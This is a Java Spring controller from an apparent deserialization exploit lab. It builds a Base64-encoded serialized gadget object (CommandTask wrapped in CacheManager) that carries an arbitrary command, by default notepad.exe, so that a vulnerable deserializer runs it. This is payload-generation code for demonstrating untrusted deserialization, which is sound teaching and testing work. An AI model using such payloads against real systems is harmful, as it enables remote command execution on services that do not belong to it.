package com.exploitlab.untrusteddeserialization.controller;

import com.exploitlab.untrusteddeserialization.gadget.CacheManager;
import com.exploitlab.untrusteddeserialization.gadget.CommandTask;
import com.exploitlab.untrusteddeserialization.service.EncoderService;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import java.util.Map;

/**
 * <b>File:</b> ExploitController.java
 * <p>
 * <b>Description:</b> Utility Controller that prepares the payload for the attack
 *
 * @author Derek Garcia
 */
@RestController
@RequestMapping("/exploit")
public class ExploitController {

    // Default payload is safe windows operation, will just open notepad
    private final static String DEFAULT_PAYLOAD = "notepad.exe";
    private final static Logger LOGGER = LoggerFactory.getLogger(EncoderController.class);
    private final EncoderService encoderService = new EncoderService();

    /**
     * Generate a Base64 encoded string with an untrusted payload
     *
     * @param payload Optional payload param in the form of {"payload":"insert-payload-here"}
     * @return Base64 encoded string with an untrusted payload
     * @throws IOException Fail to encode object
     */
    @GetMapping(consumes = "application/json")
    public ResponseEntity<String> getDemoExploit(@RequestBody(required = false) Map<String, String> payload) throws IOException {
        String payloadString = DEFAULT_PAYLOAD;    // default payload
        if (payload != null) {
            // Use custom payload if provided
            if (payload.containsKey("payload")) {
                payloadString = payload.get("payload");
                LOGGER.info("Using custom payload");

                // If not found, use default
            } else {
                LOGGER.warn("JSON provided, but payload not found. Using default payload");
            }
            // Use default payload
        } else {
            LOGGER.info("No JSON provided, using default payload");
        }

        // Load objects
        CommandTask cmdTask = new CommandTask(payloadString);
        CacheManager cm = new CacheManager(cmdTask);

        String encoding = this.encoderService.encodeObject(cm);
        LOGGER.info("Successfully Encoded Payload");

        // return encoding
        return new ResponseEntity<>(encoding, HttpStatus.OK);
    }

}
